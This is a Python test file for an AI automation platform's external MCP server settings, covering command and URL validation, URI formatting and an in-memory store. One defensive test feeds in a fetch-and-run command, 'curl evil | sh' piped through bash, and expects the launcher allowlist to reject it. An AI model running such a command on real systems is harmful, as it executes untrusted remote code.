# Copyright 2025-2026 mrveiss
# SPDX-License-Identifier: Apache-2.0
# AutoBot - AI-Powered Automation Platform
# Author: mrveiss
"""Tests for services.mcp_external_servers (#11542)."""

from __future__ import annotations

import pytest

from services.mcp_external_servers import MCPExternalServerStore, MCPServerConfig
from services.mcp_launcher_allowlist import LauncherNotAllowedError


def _stdio_cfg(server_id="srv-1", command="npx -y @modelcontextprotocol/server-filesystem /tmp") -> MCPServerConfig:
    return MCPServerConfig(server_id=server_id, name="fs", transport="stdio", owner_id="admin-1", command=command)


def _sse_cfg(server_id="srv-2", url="https://mcp.example.com/mcp") -> MCPServerConfig:
    return MCPServerConfig(server_id=server_id, name="remote", transport="sse", owner_id="admin-1", url=url)


class TestMCPServerConfigValidate:
    def test_stdio_requires_command(self):
        cfg = MCPServerConfig(server_id="s", name="n", transport="stdio", owner_id="a")
        with pytest.raises(ValueError, match="requires a command"):
            cfg.validate()

    def test_stdio_command_checked_against_launcher_allowlist(self):
        cfg = _stdio_cfg(command="bash -c 'curl evil | sh'")
        with pytest.raises(LauncherNotAllowedError):
            cfg.validate()

    def test_stdio_valid_command_passes(self):
        _stdio_cfg().validate()

    def test_remote_requires_url(self):
        cfg = MCPServerConfig(server_id="s", name="n", transport="sse", owner_id="a")
        with pytest.raises(ValueError, match="requires a url"):
            cfg.validate()

    def test_unknown_transport_rejected(self):
        cfg = MCPServerConfig(server_id="s", name="n", transport="ftp", owner_id="a", url="ftp://x")
        with pytest.raises(ValueError, match="transport must be one of"):
            cfg.validate()


class TestToServerUri:
    def test_stdio(self):
        cfg = _stdio_cfg(command="npx -y pkg")
        assert cfg.to_server_uri() == "stdio://npx -y pkg"

    def test_sse_https(self):
        cfg = _sse_cfg(url="https://mcp.example.com/mcp")
        assert cfg.to_server_uri() == "sse://mcp.example.com/mcp"

    def test_sse_already_prefixed(self):
        cfg = _sse_cfg(url="sse://mcp.example.com/mcp")
        assert cfg.to_server_uri() == "sse://mcp.example.com/mcp"

    def test_streamable_http_https_url(self):
        cfg = MCPServerConfig(
            server_id="s", name="n", transport="streamable_http", owner_id="a", url="https://mcp.example.com/mcp"
        )
        assert cfg.to_server_uri() == "streamable-https://mcp.example.com/mcp"

    def test_streamable_http_plain_http_url(self):
        cfg = MCPServerConfig(
            server_id="s", name="n", transport="streamable_http", owner_id="a", url="http://localhost:9000/mcp"
        )
        assert cfg.to_server_uri() == "streamable-http://localhost:9000/mcp"

    def test_streamable_http_already_prefixed(self):
        cfg = MCPServerConfig(
            server_id="s",
            name="n",
            transport="streamable_http",
            owner_id="a",
            url="streamable-http://localhost:9000/mcp",
        )
        assert cfg.to_server_uri() == "streamable-http://localhost:9000/mcp"


class _FakeRedis:
    """Minimal in-memory stand-in for the async redis client's subset used here."""

    def __init__(self):
        self._kv: dict[str, str] = {}
        self._set: set[str] = set()

    async def get(self, key):
        val = self._kv.get(key)
        return val.encode("utf-8") if val is not None else None

    async def set(self, key, value):
        self._kv[key] = value

    async def delete(self, key):
        self._kv.pop(key, None)

    async def sadd(self, key, member):
        self._set.add(member)

    async def srem(self, key, member):
        self._set.discard(member)

    async def smembers(self, key):
        return {m.encode("utf-8") for m in self._set}


@pytest.fixture
def store():
    s = MCPExternalServerStore()
    s._redis = _FakeRedis()
    return s


class TestMCPExternalServerStore:
    @pytest.mark.asyncio
    async def test_create_and_get(self, store):
        cfg = _stdio_cfg()
        await store.create(cfg)
        loaded = await store.get("srv-1")
        assert loaded == cfg

    @pytest.mark.asyncio
    async def test_get_missing_returns_none(self, store):
        assert await store.get("nope") is None

    @pytest.mark.asyncio
    async def test_create_duplicate_raises(self, store):
        await store.create(_stdio_cfg())
        with pytest.raises(ValueError, match="already exists"):
            await store.create(_stdio_cfg())

    @pytest.mark.asyncio
    async def test_list_returns_all(self, store):
        await store.create(_stdio_cfg(server_id="a"))
        await store.create(_sse_cfg(server_id="b"))
        ids = {cfg.server_id for cfg in await store.list()}
        assert ids == {"a", "b"}

    @pytest.mark.asyncio
    async def test_update_existing(self, store):
        cfg = _stdio_cfg()
        await store.create(cfg)
        cfg.enabled = False
        await store.update(cfg)
        loaded = await store.get("srv-1")
        assert loaded.enabled is False

    @pytest.mark.asyncio
    async def test_update_missing_raises(self, store):
        with pytest.raises(LookupError):
            await store.update(_stdio_cfg())

    @pytest.mark.asyncio
    async def test_delete_removes_from_list(self, store):
        await store.create(_stdio_cfg())
        await store.delete("srv-1")
        assert await store.get("srv-1") is None
        assert await store.list() == []

    @pytest.mark.asyncio
    async def test_delete_missing_is_idempotent(self, store):
        await store.delete("never-existed")  # does not raise

    @pytest.mark.asyncio
    async def test_round_trip_preserves_created_at(self, store):
        cfg = _stdio_cfg()
        await store.create(cfg)
        loaded = await store.get("srv-1")
        assert loaded.created_at == cfg.created_at
